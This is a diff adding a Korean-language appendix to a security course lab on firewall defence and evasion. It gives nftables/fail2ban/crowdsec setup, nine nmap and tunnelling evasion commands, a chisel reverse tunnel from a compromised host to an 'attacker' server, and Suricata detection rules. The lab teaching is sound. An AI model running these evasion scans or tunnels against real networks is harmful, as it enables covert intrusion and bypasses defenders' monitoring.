@@ -623,3 +623,190 @@ graph LR
 
 **학생 액션**: lab nftables drop 룰 → block 신호 발생 확인.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 06 방화벽 + Red 우회)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | nftables 기초 | nftables (`nft`) |
+| s2 | 기본 정책 DROP | nft chain policy |
+| s3 | 동적 차단 | fail2ban |
+| s4 | Community CTI 차단 | crowdsec |
+| s5 | Rate limit | nft limit |
+| s6 | nmap 분할 | `nmap -f --mtu 16` |
+| s7 | Decoy IP | `nmap -D RND:10` |
+| s8 | Tunnel | chisel / sshuttle |
+
+### Blue 측 환경
+
+```bash
+ssh ccc@10.20.30.1                                    # secu VM
+sudo apt install -y nftables fail2ban crowdsec ipset
+
+# nftables 기본 룰셋 (default DROP + whitelist)
+sudo tee /etc/nftables.conf << 'EOF'
+#!/usr/sbin/nft -f
+flush ruleset
+
+table inet filter {
+    set blocked {
+        type ipv4_addr
+        flags interval, timeout
+    }
+    
+    set trusted {
+        type ipv4_addr
+        flags interval
+        elements = { 10.20.30.0/24, 192.168.0.0/24 }
+    }
+    
+    chain input {
+        type filter hook input priority 0; policy drop;
+        
+        # Loopback + established
+        iif "lo" accept
+        ct state established,related accept
+        ct state invalid drop
+        
+        # ICMP (제한)
+        ip protocol icmp limit rate 10/second accept
+        
+        # Trusted 만 SSH
+        ip saddr @trusted tcp dport 22 accept
+        
+        # Blocked 차단
+        ip saddr @blocked drop
+        
+        # Web (rate limit)
+        tcp dport {80, 443, 3000} ct state new \
+            limit rate 50/second burst 100 packets accept
+        
+        # SYN flood 방어
+        tcp flags syn,rst,ack syn limit rate 5/second accept
+        
+        # 그 외 drop + log (sample)
+        log prefix "FW-DROP: " flags all limit rate 1/second
+    }
+    
+    chain forward {
+        type filter hook forward priority 0; policy drop;
+    }
+    
+    chain output {
+        type filter hook output priority 0; policy accept;
+    }
+}
+EOF
+sudo systemctl reload nftables
+
+# fail2ban
+sudo systemctl enable --now fail2ban
+
+# crowdsec (community CTI)
+curl -s https://install.crowdsec.net | sudo sh
+sudo apt install -y crowdsec crowdsec-firewall-bouncer-nftables
+sudo systemctl enable --now crowdsec
+sudo cscli scenarios install crowdsecurity/ssh-bf \
+    crowdsecurity/http-bf-wordpress_bf \
+    crowdsecurity/http-cve \
+    crowdsecurity/sqli-attack \
+    crowdsecurity/xss-attack
+sudo systemctl restart crowdsec
+```
+
+### Red — 방화벽 우회 9 기법
+
+```bash
+# === 1. 분할 (-f, --mtu) ===
+sudo nmap -sS -f --mtu 16 10.20.30.80 -p 80,443
+# 8 byte 단위 분할 → 일부 IDS 우회
+
+# === 2. Decoy (-D) ===
+sudo nmap -sS -D RND:10 10.20.30.80 -p 80
+# 가짜 source IP 10개 + 진짜 1개 → 어느 게 진짜인지 모름
+
+# === 3. Source port 위장 ===
+sudo nmap -sS --source-port 53 10.20.30.80 -p 80
+# DNS port (53) 으로 가장 → 일부 firewall 통과
+
+# === 4. Timing (-T0~T1) ===
+sudo nmap -sS -T0 10.20.30.80 -p 80
+# 매우 느림 (15분 대기 사이) — IDS rate-limit 우회
+
+# === 5. 비표준 packet ===
+sudo nmap -sX 10.20.30.80                              # XMAS scan
+sudo nmap -sN 10.20.30.80                              # NULL scan
+sudo nmap -sF 10.20.30.80                              # FIN scan
+
+# === 6. Idle/Zombie scan ===
+sudo nmap -sI <zombie-host>:80 10.20.30.80 -p 80
+# zombie 가 source 로 보임 → 진짜 IP 숨김
+
+# === 7. ProxyChains (다른 IP 로 출발) ===
+# /etc/proxychains4.conf:
+# socks5 1.2.3.4 1080
+# socks5 5.6.7.8 1080
+proxychains4 nmap -sT -Pn 10.20.30.80
+# 여러 SOCKS 통과 → 진짜 IP 숨김
+
+# === 8. SSH dynamic forward ===
+ssh -D 1080 ccc@compromised-host                      # 침투한 host 의 SOCKS proxy
+proxychains4 nmap -sT 10.20.30.0/24                   # 내부 망 스캔
+
+# === 9. chisel (HTTP tunnel — 외부 firewall 우회) ===
+# 외부 attacker:
+chisel server -p 8000 --reverse
+
+# 침투한 내부 host:
+chisel client attacker:8000 R:1080:socks
+# 이제 attacker 의 1080 → 침투 host 의 모든 네트워크 접근
+
+proxychains4 nmap -sT 10.20.30.100
+```
+
+### Blue — 우회 방어
+
+```bash
+# === Suricata 룰 (nmap 우회 탐지) ===
+sudo tee /etc/suricata/rules/nmap-evasion.rules << 'EOF'
+alert tcp any any -> $HOME_NET any (msg:"nmap fragmented scan"; \
+    fragbits:M; flags:S; sid:1000010;)
+
+alert tcp any any -> $HOME_NET any (msg:"nmap XMAS scan"; \
+    flags:FPU; sid:1000011;)
+
+alert tcp any any -> $HOME_NET any (msg:"nmap NULL scan"; \
+    flags:0; sid:1000012;)
+
+alert tcp any any -> $HOME_NET any (msg:"nmap FIN scan"; \
+    flags:F; sid:1000013;)
+EOF
+sudo systemctl reload suricata
+
+# === DPI (chisel/proxychains 탐지) ===
+# Zeek 으로 HTTP/SOCKS pattern 분석
+sudo zeek -i eth0 /opt/zeek-scripts/socks.zeek
+
+# === crowdsec 분산 IP 차단 ===
+# 다양한 source IP 에서 공격 시도 → crowdsec 가 패턴 매칭
+sudo cscli decisions list --type ban
+```
+
+### 우회 vs 탐지 매트릭스
+
+| Red 우회 | 효과 | Blue 탐지 (도구) |
+|---------|------|-----------------|
+| -f / --mtu | 약함 (IDS 70% 탐지) | Suricata fragbits rule |
+| -D RND:10 | 중간 (진짜 IP 숨김) | Wazuh frequency + correlation |
+| --source-port 53 | 약함 (modern FW 차단) | nft tcp sport != 53 + 추가 룰 |
+| -T0 timing | 강함 (rate limit 우회) | 시간 기반 anomaly (Wazuh ML) |
+| Idle scan | 매우 강함 | 거의 탐지 불가 |
+| ProxyChains | 강함 | crowdsec community CTI |
+| chisel HTTP | 매우 강함 (egress) | DLP + Suricata HTTP DPI |
+| sshuttle | 매우 강함 | Endpoint EDR (Falco) |
+
+학생은 본 6주차에서 **Blue (nftables + fail2ban + crowdsec) ↔ Red (nmap evasion + chisel + sshuttle + proxychains4)** 의 방화벽 공방을 OSS 도구로 익힌다.
